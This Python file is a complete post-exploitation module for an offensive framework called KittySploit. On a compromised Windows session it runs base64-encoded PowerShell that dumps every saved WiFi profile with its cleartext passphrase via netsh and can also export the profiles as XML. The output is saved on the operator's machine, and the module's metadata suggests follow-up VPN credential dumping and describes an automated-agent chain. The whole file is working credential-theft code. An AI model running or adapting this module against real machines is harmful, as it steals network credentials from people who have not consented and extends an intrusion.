#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Extract saved WLAN profiles and cleartext key material
(Metasploit-style post/windows/wlan/wlan_profile).
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"


class Module(Post):
    __info__ = {
        "name": "Windows Gather Wireless Profile",
        "description": (
            "Enumerate saved Wireless LAN profiles and attempt to recover "
            "cleartext key material with 'netsh wlan show profile key=clear' "
            "on a Windows shell or Meterpreter session. On modern Windows this "
            "yields the passphrase; on XP the PBKDF2-derived key may be shown instead."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1555/",
            "https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/wlan/wlan_profile.rb",
        ],
        "tags": ["windows", "post", "gather", "wlan", "wifi", "credentials"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials"],
            "cost": 1.5,
            "noise": 0.4,
            "value": 1.2,
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": ["wifi_creds"],
                "suggested_followups": [
                    "post/shell/windows/wlan/wlan_current_connection",
                    "post/shell/windows/gather/dump_vpn_profiles",
                ],
            },
        },
    }

    save_local = OptBool(True, "Save results under ./output", False)
    include_xml = OptBool(
        False,
        "Also export each profile as XML (netsh wlan export profile key=clear)",
        False,
    )

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _powershell_script(self, export_xml: bool) -> str:
        export_flag = "$true" if export_xml else "$false"
        return rf"""
$ErrorActionPreference = 'Continue'
$exportXml = {export_flag}

$profileLines = netsh wlan show profiles 2>&1
$joined = ($profileLines | Out-String)
if ($joined -match '(?i)(not supported|not available|not present|n.?est pas|nicht verf)') {{
  Write-Output "WLAN_ERROR: WLAN stack unavailable`n$joined"
  return
}}

$profileNames = $profileLines | Where-Object {{
  $_ -match 'All User Profile|User Profile|Profil Tous les utilisateurs|Profil utilisateur|Perfil de todos los usuarios|Perfil de usuario|Benutzerprofil|Alle Benutzerprofil'
}} | ForEach-Object {{
  if ($_ -match ':\s*(.+)\s*$') {{ $matches[1].Trim() }}
}} | Where-Object {{ $_ }} | Select-Object -Unique

if (-not $profileNames) {{
  Write-Output 'No saved WiFi profiles found for the current user.'
  return
}}

$sections = New-Object System.Collections.Generic.List[string]
$sections.Add("Wireless LAN Profile Information`nProfiles found: $($profileNames.Count)")

$exportDir = $null
if ($exportXml) {{
  $exportDir = Join-Path $env:TEMP ("wlan_export_" + [guid]::NewGuid().ToString('N').Substring(0,8))
  New-Item -ItemType Directory -Path $exportDir -Force | Out-Null
}}

foreach ($network in $profileNames) {{
  $detail = netsh wlan show profile name="$network" key=clear 2>&1
  $detailText = ($detail | Out-String).TrimEnd()

  $keyContent = ''
  if ($detailText -match '(?im)^\s*Key Content\s*:\s*(.+)$') {{
    $keyContent = $matches[1].Trim()
  }} elseif ($detailText -match '(?im)^\s*Contenu de la cl[eé]\s*:\s*(.+)$') {{
    $keyContent = $matches[1].Trim()
  }} elseif ($detailText -match '(?im)^\s*Inhalt des Schl[uü]ssels\s*:\s*(.+)$') {{
    $keyContent = $matches[1].Trim()
  }}

  $auth = ''
  if ($detailText -match '(?im)^\s*Authentication\s*:\s*(.+)$') {{ $auth = $matches[1].Trim() }}
  elseif ($detailText -match '(?im)^\s*Authentification\s*:\s*(.+)$') {{ $auth = $matches[1].Trim() }}

  $cipher = ''
  if ($detailText -match '(?im)^\s*Cipher\s*:\s*(.+)$') {{ $cipher = $matches[1].Trim() }}
  elseif ($detailText -match '(?im)^\s*Chiffrement\s*:\s*(.+)$') {{ $cipher = $matches[1].Trim() }}

  $header = "=== Profile: $network ==="
  if ($keyContent) {{
    $header += "`nKey Content: $keyContent"
  }} else {{
    $header += "`nKey Content: (not available — need elevated privileges or open network)"
  }}
  if ($auth) {{ $header += "`nAuthentication: $auth" }}
  if ($cipher) {{ $header += "`nCipher: $cipher" }}

  $sections.Add("$header`n`n$detailText")

  if ($exportXml -and $exportDir) {{
    $null = netsh wlan export profile name="$network" folder="$exportDir" key=clear 2>&1
  }}
}}

if ($exportXml -and $exportDir -and (Test-Path -LiteralPath $exportDir)) {{
  Get-ChildItem -LiteralPath $exportDir -Filter '*.xml' -ErrorAction SilentlyContinue | ForEach-Object {{
    try {{
      $xml = Get-Content -LiteralPath $_.FullName -Raw -ErrorAction Stop
      $sections.Add("=== Exported XML: $($_.Name) ===`n$xml")
    }} catch {{
      $sections.Add("=== Exported XML: $($_.Name) (read failed) ===")
    }}
  }}
  Remove-Item -LiteralPath $exportDir -Recurse -Force -ErrorAction SilentlyContinue
}}

$sections -join "`n`n"
"""

    def check(self):
        netsh_check = self._execute_cmd("where netsh")
        if not netsh_check or "netsh" not in netsh_check.lower():
            print_error("netsh.exe is not available on the target")
            return False

        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False

        wlan_check = self._execute_cmd("netsh wlan show interfaces")
        if wlan_check and re.search(
            r"(not supported|not available|not present|n.est pas)", wlan_check, re.I
        ):
            print_warning("WLAN stack may be unavailable on this host")
        return True

    def _save_output(self, content: str) -> str:
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"wlan_profile_{stamp}.txt")
        with open(local_path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        return local_path

    def run(self):
        if not self.check():
            raise ProcedureError(
                FailureType.NotCompatible,
                "WLAN profile extraction prerequisites not met",
            )

        export_xml = self._bool_opt(self.include_xml, False)
        print_status("Extracting saved wireless LAN profiles...")
        if export_xml:
            print_status("XML profile export enabled")

        result = self._run_powershell(self._powershell_script(export_xml))

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned")

        if re.search(r"WLAN_ERROR:", result, re.I):
            print_error(result)
            raise ProcedureError(FailureType.NotCompatible, result)

        if re.search(r"No saved WiFi profiles found", result, re.I):
            print_warning(result)
            return True

        if self._bool_opt(self.save_local, True):
            local_path = self._save_output(result + "\n")
            print_success(f"Results saved to ./{local_path}")

        print_success("WLAN profile extraction completed")
        print_info(result)
        return True
